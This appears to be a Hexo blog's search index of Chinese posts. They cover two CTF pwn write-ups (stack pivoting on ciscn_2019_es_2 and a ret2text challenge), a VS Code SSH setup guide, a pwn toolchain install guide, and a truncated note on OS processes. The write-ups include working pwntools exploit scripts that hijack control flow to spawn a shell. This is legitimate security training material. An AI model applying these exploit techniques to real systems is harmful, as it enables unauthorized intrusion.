<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>栈迁移</title>
      <link href="/2024/07/24/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2024/07/24/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="背景及原理"><a href="#背景及原理" class="headerlink" title="背景及原理"></a>背景及原理</h2><p>我们在栈溢出时，有时候会碰到可供写入的字节数不够，比如只溢出到retaddr后面一点点，不够我们构造payload，这个时候可以考虑使用栈溢出</p><h3 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h3><p>先回顾一下栈帧的概念，栈帧也叫过程活动记录，是编译器用来实现函数调用过程的一种数据结构。C语言中，每个栈帧对应着一个未运行完的函数。从逻辑上讲，栈帧就是一个函数执行的环境：函数调用框架、函数参数、函数的局部变量、函数执行完后返回到哪里等等。栈是从高地址向低地址延伸的。每个函数的每次调用，都有它自己独立的一个栈帧，这个栈帧中维持着所需要的各种信息。寄存器ebp指向当前的栈帧的底部（高地址），寄存器esp指向当前的栈帧的顶部（低地址）</p><hr><p>栈溢出实现关键在于对ebp和esp的控制，也就是说，我们劫持esp和ebp，构造出一个新的栈帧，让系统执行这个栈帧。对于ebp来说，我们可以通过修改previous of ebp 这个位置的内容来控制，对于esp，则有leave这个指令，leave等同于mov esp ebp和pop ebp  （可以通过ROPgadget来找）</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>以ciscn_2019_es_2这题为例<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-24%20174338.png" alt="q"></p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-24%20174441.png" alt="a"></p><p>可以看到在vul函数中，我们利用read可以读入的数据只有0x30，显然不够构造一次完整的payload，所以我们考虑栈迁移</p><p>第一次read用于泄露old ebp的地址，第二次来构造栈迁移</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28853</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot; name?&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">36</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">old_ebp_addr=u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])  <span class="comment">#接收old ebp地址</span></span><br><span class="line">log.success(<span class="string">&quot;old_ebp=&quot;</span>+<span class="built_in">hex</span>(old_ebp_addr)) <span class="comment">#打印old ebp地址 （对exp无影响）</span></span><br><span class="line">leave_ret=<span class="number">0x08048562</span>  <span class="comment">#利用ROPgadget查找   ROPgadget --binary ciscn_2019_es_2 | grep &#x27;leave&#x27;</span></span><br><span class="line">system_plt_addr=<span class="number">0x08048400</span></span><br><span class="line">payload=<span class="string">b&#x27;aaaa&#x27;</span>+p32(system_plt_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(old_ebp_addr-<span class="number">0x38</span>+<span class="number">16</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p32(old_ebp_addr-<span class="number">0x38</span>) <span class="comment">#将ebp劫持到缓冲区起始处（距离ebp 0x38）</span></span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>第二次的payload前面的’aaaa’是因为执行leave后（其中的pop ebp）会导致esp的值增长一个字长,如下图<br>执行完leave指令（我们填入的leave）后的情况：<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-24%20180424.png" alt="a"></p><p>ebp里面是aaaa，esp指向system的地址，成功执行system函数</p>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一题需要动调的ret2text</title>
      <link href="/2024/07/17/ret2text(%E8%BF%9B%E9%98%B6)/"/>
      <url>/2024/07/17/ret2text(%E8%BF%9B%E9%98%B6)/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p><em>题目附件：<a href="https://raw.githubusercontent.com/C17zz/Pages/main/Img/stack">https://raw.githubusercontent.com/C17zz/Pages/main/Img/stack</a></em></p><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>checksec一下<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20155251.png" alt="1"><br>nx打开，没有pie，没有canary<br>转ida<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20155611.png" alt="1"><br>init()初始化作用，剩下一个vuln函数<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20155648.png" alt="1"><br>可以看到用for循环加read函数往s数组写入，但是for循环的次数由用户控制，这就存在缓冲区溢出漏洞，并且存在backdoor函数，是一个ret2text模型<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20155707.png" alt="1"></p><p>我们先试着打看看<br>会发现打不通<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20160840.png" alt="1"></p><p>&emsp;&emsp;打不通有两种情况，一种是没有执行到backdoor，一种是执行到了但是因为栈对齐的问题导致system函数没有正常执行。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>这个时候就要进入动态调试环节，我们先把断点下在vuln结束的ret处<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20171457.png" alt="1"><br>然后发现填入的数据并没有覆盖到rbp+8处，说明read函数有问题<br>于是我们再将断点下在call read处<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20163603.png" alt="1"><br>然后continue，直到在偏移（相对于数组起始地址）0x1c处,我们看到在此时read的汇编是这样<br><img src="https://raw.githubusercontent.com/C17zz/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-17%20164237.png" alt="1"><br>read写入的地址存储在rsi，rsi由rax赋值给它，rax&#x3D;rax+rdx，即[rbp - 4]+[rbp - 0x20]，而此时我们发现[rbp - 4]的地址正是偏移（相对于数组起始地址）0x1c处，所以0x1c处填入的数据会改变read写入的地址，于是我们的payload需要做出改变，在0x1c处填入’\x27’，从而让read写入的地址跳转到[rbp + 8]，再补上backdoor的地址就可以了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./stack&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">200</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x4012EB</span></span><br><span class="line">payload = cyclic(<span class="number">0x1c</span>)+<span class="string">b&#x27;\x27&#x27;</span>+p64(backdoor_addr)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x04012E5&#x27;)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2text </tag>
            
            <tag> 动态调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VScode远程连接虚拟机以及免密登录</title>
      <link href="/2024/04/16/VScode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/"/>
      <url>/2024/04/16/VScode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="一、安装VScode扩展"><a href="#一、安装VScode扩展" class="headerlink" title="一、安装VScode扩展"></a>一、安装VScode扩展</h2><p>这两个都可以<br><img src="https://gateway.pinata.cloud/ipfs/bafkreib3kvikh2y4ts6a6vzaqy6aouor7prjrxgy4t7kmpby7h3fe6ddli" alt="0"></p><p><em>Remote SSH 扩展：Remote SSH 扩展允许你通过 SSH 连接到远程计算机，并在本地的 VSCode 编辑器中进行编辑和调试。你可以使用该扩展连接到远程服务器、虚拟机或容器，并在远程主机上执行命令和调试任务。Remote SSH 扩展适用于那些希望在远程计算机上进行开发和调试的场景。它提供了与远程主机的基本交互和编辑功能。</em></p><p><em>Remote Development 扩展：Remote Development 扩展是一个更加综合的扩展，它提供了比 Remote SSH 更广泛的远程开发功能。Remote Development 扩展支持多种远程连接协议，包括 SSH、容器、WSL（Windows Subsystem for Linux）等。它不仅可以通过 SSH 连接到远程主机，还可以在本地开发环境中使用容器，或者通过 WSL 在 Windows 上进行 Linux 开发。Remote Development 扩展还提供了一些其他功能，例如远程容器的自动同步、远程环境的访问控制等。</em></p><h2 id="二、虚拟机方面"><a href="#二、虚拟机方面" class="headerlink" title="二、虚拟机方面"></a>二、虚拟机方面</h2><p><strong>1.安装ssh服务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openssh-server -y</span><br><span class="line">ps -e | grep sshd   //检查是否正常安装</span><br></pre></td></tr></table></figure><p><strong>2.查找ip</strong></p><p>这两个指令都行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure><p><img src="https://gateway.pinata.cloud/ipfs/bafkreiatdhwek43wsar3e4pfdrin7tt4enyyb45tv3kmo6x7pblcbfbtli" alt="0"></p><p>我们需要的是红色这部分（本地地址）（如果有斜杠，斜杠后面的数字不需要），这个是本地地址 （绿色的是广播地址）</p><h2 id="三、使用VScode远程连接"><a href="#三、使用VScode远程连接" class="headerlink" title="三、使用VScode远程连接"></a>三、使用VScode远程连接</h2><p><img src="https://gateway.pinata.cloud/ipfs/bafybeie7c47mzqmejdxlsf326bfhjcbhrs4itpg6aznlop3wo3ocehedny" alt="0"></p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreihiehwbkl6fqfx22xtkn767wwad24gfnijzg4fustl46vlcnhgrwy" alt="0"></p><p>按照它给的格式输入<br>即 </p><blockquote><p>ssh 用户名@本地地址</p></blockquote><p><img src="https://gateway.pinata.cloud/ipfs/bafkreigtaxmhlnfuxg3epwad5urlpipm2hx4leaiemp5sfgfoagvjxe6om" alt="0"></p><p>上面的默认选项就行</p><p>然后就ok了，接下来重复上面的操作，然后选择刚刚添加的host就能连接了</p><p><img src="https://gateway.pinata.cloud/ipfs/bafkreifcuar4jdaeqjojlrolrct3bhas7vdi3oba4cefkmuxvxv6ti7p3a" alt="0"><br>虚拟机是Linux系统就选Linux</p><p>然后输个虚拟机密码就行</p><h2 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h2><p>在windows的命令窗口输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure><p>enter三次确认生成公钥</p><p>到目录C:\Users\用户名.ssh查看公钥<br>记事本打开id_rsa.pub ，复制里面全部内容</p><p>转到虚拟机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -a  // 查看有没有.ssh文件，没有就执行下一条命令，生成一个</span><br><span class="line">mkdir .ssh</span><br><span class="line">vim ~/.ssh/authorized_keys  //打开后把刚刚复制的公钥粘贴进去然后保存</span><br></pre></td></tr></table></figure><p><em>如果是手动创建的.ssh目录和authorized_keys文件，需要将其权限分别修改为700和600</em></p>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> VScode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-environment</title>
      <link href="/2024/04/15/pwn-environment/"/>
      <url>/2024/04/15/pwn-environment/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p><em>建议都在root权限下安装</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><h2 id="替换软件源"><a href="#替换软件源" class="headerlink" title="替换软件源"></a>替换软件源</h2><p>官方源下载太慢了，建议换成国内源（清华源、阿里源等） <del>虽然换了后我还是开着代理</del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">cp /etc/apt/sources.list /etc/apt/sources.list.old</span><br><span class="line">vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>然后把原来的源删掉，对应版本的源复制进去<br><em>附：<a href="https://mirrors.tuna.tsinghua.edu.cn/">https://mirrors.tuna.tsinghua.edu.cn/</a>  清华源</em><br><em>不一定要用vi，其他文本编辑器也行</em></p><p>然后执行该命令验证一下源更换是否成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><h2 id="vim-安装-一个好用的文本编辑器"><a href="#vim-安装-一个好用的文本编辑器" class="headerlink" title="vim 安装 (一个好用的文本编辑器)"></a>vim 安装 (一个好用的文本编辑器)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">apt update &amp;&amp; apt install vim</span><br></pre></td></tr></table></figure><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; apt install git</span><br><span class="line">git --version</span><br></pre></td></tr></table></figure><h2 id="安装gcc"><a href="#安装gcc" class="headerlink" title="安装gcc"></a>安装gcc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; apt install gcc</span><br><span class="line">gcc --version</span><br></pre></td></tr></table></figure><h2 id="安装python3-pip"><a href="#安装python3-pip" class="headerlink" title="安装python3-pip"></a>安装python3-pip</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; apt install python3-pip</span><br><span class="line">pip3 --version</span><br></pre></td></tr></table></figure><h2 id="安装python3"><a href="#安装python3" class="headerlink" title="安装python3"></a>安装python3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; apt install python3</span><br><span class="line">python3 --version</span><br></pre></td></tr></table></figure><h2 id="安装gdb-multiarch"><a href="#安装gdb-multiarch" class="headerlink" title="安装gdb-multiarch"></a>安装gdb-multiarch</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install gdb-multiarch</span><br><span class="line">gdb-multiarch --version</span><br></pre></td></tr></table></figure><h2 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Gallopsled/pwntools.git</span><br><span class="line">sudo apt update &amp;&amp; apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line">pip3 list | grep pwntools</span><br></pre></td></tr></table></figure><p><em><strong>关于git</strong></em><br><em>git clone如果出现超时，可以试试进行如下操作</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如原地址为</span></span><br><span class="line">git clone https://github.com/tensorflow/tensorflow.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改后的地址：</span></span><br><span class="line">git clone https://gitclone.com/github.com/tensorflow/tensorflow.git </span><br></pre></td></tr></table></figure><p><em>就是在前面加个gitclone.com</em><br><em>或者试试开个代理？</em></p><p><em><strong>关于pip</strong></em><br><em>如果pip失败，提示超时，可以试试增加pip的超时时间</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --default-timeout=1000 package_name</span><br></pre></td></tr></table></figure><p><em>或者检查一下网络，开代理等等</em></p><h2 id="安装pwndbg、peda、gef"><a href="#安装pwndbg、peda、gef" class="headerlink" title="安装pwndbg、peda、gef"></a>安装pwndbg、peda、gef</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg.git</span><br><span class="line">git clone https://github.com/longld/peda.git</span><br><span class="line">git clone https://github.com/hugsy/gef.git</span><br><span class="line">cd ~/tools/pwndbg</span><br><span class="line"># 安装</span><br><span class="line">./setup.sh</span><br><span class="line"># 安装依赖插件</span><br><span class="line">pip3 install keystone-engine ropper keystone-engine</span><br><span class="line"># 可以通过编辑gdbinit挂载插件，如果.gdbinit显示为目录，就把它删掉，重新创建一个.gdbinit的文件</span><br><span class="line">vim ~/.gdbinit</span><br><span class="line"></span><br><span class="line"># 这个根据自己的路径来就可以了，用哪个就添加哪个，不用的记得注释掉</span><br><span class="line">source /root/Env/pwndbg/gdbinit.py</span><br><span class="line">#source /root/Env/peda/peda.py</span><br><span class="line">#source /root/Env/gef/gef.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安装ROPgadget"><a href="#安装ROPgadget" class="headerlink" title="安装ROPgadget"></a>安装ROPgadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install capstone</span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line">cd ROPgadget</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><h2 id="安装seccomp-tools"><a href="#安装seccomp-tools" class="headerlink" title="安装seccomp-tools"></a>安装seccomp-tools</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br><span class="line">seccomp-tools --version</span><br></pre></td></tr></table></figure><h2 id="安装LibcSearcher"><a href="#安装LibcSearcher" class="headerlink" title="安装LibcSearcher"></a>安装LibcSearcher</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line"># 安装</span><br><span class="line">python3 setup.py develop</span><br><span class="line"></span><br><span class="line"># 查看是否安装成功</span><br><span class="line">pip3 list | grep LibcSearcher</span><br></pre></td></tr></table></figure><h2 id="安装patchelf"><a href="#安装patchelf" class="headerlink" title="安装patchelf"></a>安装patchelf</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 更新索引并安装patchelf</span><br><span class="line">sudo apt update &amp;&amp; apt install patchelf </span><br><span class="line"></span><br><span class="line"># 验证安装是否成功</span><br><span class="line">patchelf --version</span><br></pre></td></tr></table></figure><h2 id="安装ropper"><a href="#安装ropper" class="headerlink" title="安装ropper"></a>安装ropper</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 安装依赖项capstone (前面装过了的话就跳过这步)</span><br><span class="line">pip3 install capstone</span><br><span class="line"># 安装依赖项filebytes</span><br><span class="line">pip3 install filebytes</span><br><span class="line"># 拉取源代码</span><br><span class="line">git clone https://github.com/sashs/ropper.git</span><br><span class="line"># 切换到目录下</span><br><span class="line">cd roppper</span><br><span class="line"># 如果setup.py没有执行权限，先赋予执行权限</span><br><span class="line">chmod +x setup.py</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><h2 id="安装one-gadget"><a href="#安装one-gadget" class="headerlink" title="安装one_gadget"></a>安装one_gadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 更新并安装依赖</span><br><span class="line">sudo apt update &amp;&amp; apt -y ruby ruby-dev</span><br><span class="line"># 安装one_gadget</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统——进程</title>
      <link href="/2024/04/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%BF%9B%E7%A8%8B/"/>
      <url>/2024/04/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="最大限度利用CPU"><a href="#最大限度利用CPU" class="headerlink" title="最大限度利用CPU"></a>最大限度利用CPU</h2><p>&emsp;&emsp;在计算机发展早期，CPU资源十分宝贵，如果一个CPU只能运行一个程序，那么当这个程序读写磁盘是，CPU就闲下来了，这在当时无异于暴殄天物，于是人们编写了一个监控程序，当某个程序暂时不使用CPU时，监控程序就把另一个在等待CPU资源的程序启动，使CPU得以充分利用，这种方法被称为<strong>多道程序（Multiprogramming）</strong>，原始但是有效，但其有个问题就是程序的执行不分轻重缓急，调度策略太过于粗糙，当多个程序同时运行时，容易出现问题，有一些急需处理的程序可能要等到很久以后才能分配到CPU，<del>比如当你当你点击鼠标，但是要等个十分钟才有响应，这是很难受的</del><br>&emsp;&emsp;稍作改进，让程序运行模式变成一种协作模式，即程序使用一段时间的CPU后会主动让出，这种程序协作模式叫做<strong>分时系统（Time-Sharing System）</strong>,<br>此时完整的操作系统雏形已经逐渐形成，不过这种方式也存在问题，如果此时某项程序正在进行一项耗时的计算，霸占着CPU不放，那么其他程序只能等待，整个系统看上去就好像“死机”了一样。<br>&emsp;&emsp;于是我们再进行改进，直到现在我们熟悉的<strong>多任务（Multi-tasking）系统</strong>。操作系统接管了所有的硬件资源，并且本身运行在一个受硬件保护的级别。所有的应用程序都以<strong>进程（Process）</strong>的方式运行在比操作系统更低的级别，每个进程都有自己独立的地址空间，使得进程之间的地址空间相互隔离，每个进程根据进程优先级的高低都有机会得到CPU。但是,如果运行时间超出了一定的时间，操作系统会强制暂停该进程，将CPU资源分配给其他等待运行的进程。这种CPU分配方式称为<strong>抢占式</strong>。操作系统可以强制剥夺CPU资源并且分配给它认为目前最需要CPU的进程。如果操作系统分配给每个进程的时间都很短，即CPU在多个进程间快速地切换，就能造成了很多进程都在同时运行的假象（即<strong>伪并行</strong>(pseudoparallelism) ）。</p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>操作系统中的进程是指正在执行的程序的实例。进程是计算机系统中的基本执行单位，它具有独立的内存空间和执行状态。</p><hr><p>在网上看到一个有意思的比喻：<br>&emsp;&emsp;想想一位会做饭的计算机科学家正在为他的女儿制作生日蛋糕。他有做生日蛋糕的食谱，厨房里有所需的原料：面粉、鸡蛋、糖、香草汁等。在这个比喻中，做蛋糕的食谱就是程序、计算机科学家就是 CPU、而做蛋糕的各种原料就是输入数据。进程就是科学家阅读食谱、取来各种原料以及烘焙蛋糕等一系列动作的总和。<br>&emsp;&emsp;现在假设科学家的儿子跑过来告诉他，说他的头被蜜蜂蜇了一下，那么此时科学家会记录出来他做蛋糕这个过程到了哪一步，然后拿出急救手册，按照上面的步骤给他儿子实施救助。这里，会涉及到进程之间的切换，科学家（CPU）会从做蛋糕（进程）切换到实施医疗救助（另一个进程）。等待伤口处理完毕后，科学家会回到刚刚记录做蛋糕的那一步，继续制作。</p><hr><h3 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h3><p>在操作系统中，进程可以处于不同的状态，这些状态反映了进程在执行过程中的不同情况和条件。<br>常见的进程状态包括：<br>1.<strong>新建（New）</strong>：进程刚被创建但还未被操作系统接受和分配资源。<br>2.<strong>就绪（Ready）</strong>：进程已经准备好执行并等待分配处理器资源。<br>3.<strong>运行（Running）</strong>：进程正在执行中，占用CPU资源。<br>4.<strong>阻塞（Blocked）</strong>：进程因为某些原因而无法继续执行，例如等待某个事件发生、等待输入&#x2F;输出完成或等待资源释放。<br>5.<strong>终止（Terminated）</strong>：进程的执行已经结束，可能是正常结束或异常结束。</p><h3 id="进程控制"><a href="#进程控制" class="headerlink" 